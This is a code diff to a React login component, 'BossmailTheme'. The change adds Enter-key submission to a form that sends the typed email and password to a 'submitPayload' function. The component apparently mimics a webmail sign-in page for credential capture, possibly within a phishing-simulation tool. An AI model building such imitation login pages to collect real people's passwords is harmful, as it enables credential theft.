@@ -15,8 +15,8 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { reportViolation, submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async (e?: React.FormEvent) => {
-    if (e) e.preventDefault();
+  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
+    e.preventDefault();
     setIsSubmitting(true);
     try {
       await submitPayload({ email: username, password }, 'bossmail');
@@ -25,6 +25,12 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
       console.error(err);
     } finally {
       setIsSubmitting(false);
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') {
+      handleSubmit(e);
     }
   };
 
@@ -107,6 +113,7 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
                     setUsername(e.target.value);
                     if (error) setError(null);
                   }}
+                  onKeyDown={handleKeyDown}
                   className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
                 />
               </div>
@@ -125,6 +132,7 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
                     setPassword(e.target.value);
                     if (error) setError(null);
                   }}
+                  onKeyDown={handleKeyDown}
                   className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
                 />
               </div>
